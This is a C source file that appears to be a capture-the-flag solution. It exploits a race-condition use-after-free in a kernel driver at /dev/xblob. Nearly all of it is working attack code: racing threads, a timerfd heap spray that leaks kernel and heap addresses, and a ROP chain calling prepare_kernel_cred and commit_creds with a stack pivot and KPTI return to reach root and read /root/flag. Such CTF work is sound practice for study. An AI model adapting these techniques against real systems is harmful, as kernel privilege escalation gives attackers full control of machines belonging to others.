#include "utils.h"

#define DEVICE_PATH "/dev/xblob"
#define BUFFER_SIZE 0x100

u64 kernel_base, heap_base, fake_stack;
u64 user_cs, user_sp, user_ss, user_rflags;
u64 gadget = 0x389378;
u64 commit_creds = 0x72720;
u64 cred_init = 0xffffffff81f3124e - 0xffffffff81000000;
u64 swapgs_restore_regs_and_return_to_usermode = 0xffffffff81800e10 - 0xffffffff81800000;
// u64 kpti_trampoline = 0xffffffff81800e10 - 0xffffffff81800000 + 22;
u64 kpti_trampoline = 0x800e10 + 22;
u64 prepare_kernel_cred = 0x728c0;
u64 pop_rdi = 0x9afdd;
u64 pop_rax = 0x1365da;
u64 push_rax = 0x250b9;
u64 or_rdx_rax = 0x2fe17;
u64 or_rdi_rax = 0x2c6b4;
u64 pop_rdx = 0x275556;
// int xblob_fd1 = 0, xblob_fd2;
int start = 0;
void do_timer(int leak) {

    struct itimerspec itspec;

    itspec.it_interval.tv_sec = 0;
    itspec.it_interval.tv_nsec = 0;
    itspec.it_value.tv_sec = 10;
    itspec.it_value.tv_nsec = 0;

    int timer_fd = timerfd_create(CLOCK_REALTIME, 0);
    timerfd_settime(timer_fd, 0, &itspec, 0);

    /*
        Is important to note that the structure is freed using kfree_rcu. 
        kfree_rcu() will deallocate the object using kfree() after a grace period 
        to ensure the object is no longer used by any thread. 
        We can simply avoid this problem using sleep(1) after freeing the object to pass the period time check
        to make sure it has actually been freed.
    */

    if (leak) {
        close(timer_fd);    // put timerfd_ctx to kmalloc-256 freelist    
        sleep(1);           // avoid 
    }
}

void *race(int xblob_fd)
{
    // puts("[!] Wait for signal!!!!!!!!!!!");
    // printf("xblob_fd: %d\n", xblob_fd);
    while (!start);
    usleep(1000);
    return close(xblob_fd);

    // return resp;
}

void get_flag() 
{
    int flag_fd;
    char flag[0x50];
    printf("uid: %d\n", getuid());
	// flag_fd = open("/flag", O_RDONLY);
	// read(flag_fd, flag, 0x50);
	// puts(flag);
	flag_fd = open("/root/flag", O_RDONLY);
	read(flag_fd, flag, 0x50);
	puts(flag);

}

void aa()
{
    printf("uid: %d\n", getuid());
    puts("Win!");
}

void *race_open(void)
{
    while (!start);
    
    return open(DEVICE_PATH, O_RDWR);

}

void save_state(void) {
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"              // move value of register cs to variable user_cs 
        "mov user_ss, ss;"              // move value of register ss to variable user_ss
        "mov user_sp, rsp;"             // move value of register rsp to variable user_sp
        "pushf;"                        // push flags onto stack (16 bit) 
        "pop user_rflags;"              // pop flags to variable user_rflags
        ".att_syntax;"
    );
    printf("[*] Saved state\n");
}

int main() 
{
    puts("[*] .bss: 0xffffffffc00023c0");
    // puts("[*] module_close: 0xffffffffc0000000");
    // puts("[*] module_write: 0xffffffffc0000020");
    // puts("[*] module_open: 0xffffffffc0000060");
    // puts("[*] module_read: 0xffffffffc00000c0");
    // puts("[*] module_cleanup: 0xffffffffc00000ff");

    save_state();
    char buffer[0x100] = {0};

    // spray
    int timerfd_list[0x100] = {0};
    for (int i=0;i<0x100;i++) {
        struct itimerspec itspec;

        itspec.it_interval.tv_sec = 0;
        itspec.it_interval.tv_nsec = 0;
        itspec.it_value.tv_sec = 1000;
        itspec.it_value.tv_nsec = 0;

        int timer_fd = timerfd_create(CLOCK_REALTIME, 0);
        timerfd_list[i] = timer_fd;
        timerfd_settime(timer_fd, 0, &itspec, 0);
    }

    int32_t pthread1_result = -2, pthread2_result = -2;
    for (int i=0;i<0x10000;i++) {
        pthread_t tid1, tid2;

        pthread_create(&tid1, NULL, race_open, NULL);
        pthread_create(&tid2, NULL, race_open, NULL);

        // its about to go down xD
        usleep(5000);
        start = 1;

        pthread_join(tid1, &pthread1_result);
        pthread_join(tid2, &pthread2_result);

        if (pthread1_result > 0 && pthread2_result > 0)
            break;
        else if (pthread1_result == -1 && pthread2_result == -1)
            panic("[!] Failed!");
        usleep(1000);
        if (pthread1_result != -1)
            close(pthread1_result);
        if (pthread2_result != -1)
            close(pthread2_result);
    }
    close(pthread2_result);
    do_timer(1);

    read(pthread1_result, buffer, 0x100);
    dump_output(buffer, 0x100);

    u64 *leak = (u64 *) buffer;
    if (leak[0] == 0)
        panic("[!] Error when leak");
    kernel_base = leak[5] - (0x190990);
    heap_base = leak[0];
    fake_stack = heap_base + 0xa0; 
    pop_rdi += kernel_base;
    pop_rax += kernel_base;
    kpti_trampoline += kernel_base;
    commit_creds += kernel_base;
    cred_init += kernel_base;
    gadget += kernel_base;
    prepare_kernel_cred += kernel_base;
    pop_rdx += kernel_base;
    or_rdi_rax += kernel_base;
    or_rdx_rax += kernel_base;

    printf("kernel_base: 0x%lx\n", kernel_base);
    printf("heap_base: 0x%lx\n", heap_base);
    printf("fake_stack: 0x%lx\n", fake_stack);
    printf("pop rdi: 0x%lx\n", pop_rdi);
    printf("pop rax: 0x%lx\n", pop_rax);
    printf("kpti_trampoline: 0x%lx\n", kpti_trampoline);
    printf("commit_creds: 0x%lx\n", commit_creds);
    printf("cred_init: 0x%lx\n", cred_init);
    // printf("push rax ; or byte ptr [rbx + 0x41], bl ; pop rsp ; pop rbp ; ret: %0xlx\n", gadget);
    printf("push rcx ; add ebx, dword ptr [rbx + 0x41] ; pop rsp ; pop rbp ; ret: 0x%lx\n", gadget);

   
    for (int i=0;i<0xf0;i++) {
        struct itimerspec itspec;

        itspec.it_interval.tv_sec = 0;
        itspec.it_interval.tv_nsec = 0;
        itspec.it_value.tv_sec = 5;
        itspec.it_value.tv_nsec = 0;

        int timer_fd = timerfd_create(CLOCK_REALTIME, 0);
        timerfd_settime(timer_fd, 0, &itspec, 0);
    }

    char clgt[0x100] = {0};
    read(pthread1_result, clgt, 0x100);
    puts("---------------------------");
    dump_output(clgt, 0x100);

    // getchar();
    leak = (u64 *) clgt;
    leak[5] = gadget;
    leak[0] = heap_base + 0x50-0x8 - 0x18;
    
    int idx = 10;
    leak[idx++] = pop_rdi;
    leak[idx++] = 0;
    leak[idx++] = prepare_kernel_cred;
    leak[idx++] = pop_rdi;
    leak[idx++] = 0;
    leak[idx++] = pop_rdx;
    leak[idx++] = 0;
    leak[idx++] = or_rdx_rax;
    leak[idx++] = or_rdi_rax;
    leak[idx++] = commit_creds;
    leak[idx++] = kpti_trampoline;
    leak[idx++] = 0xdeadbeef;
    leak[idx++] = 0xdeadbeef;
    leak[idx++] = (ulong) aa;
    leak[idx++] = user_cs;
    leak[idx++] = user_rflags;
    leak[idx++] = user_sp;
    leak[idx++] = user_ss;
    // leak[20] = popk
    puts("---------------------------");
    dump_output(clgt, 0x100);
    write(pthread1_result, clgt, 0x100);

    debug("debug nowwwwwwwwwwwww");
    sleep(10);
    return 0;
}
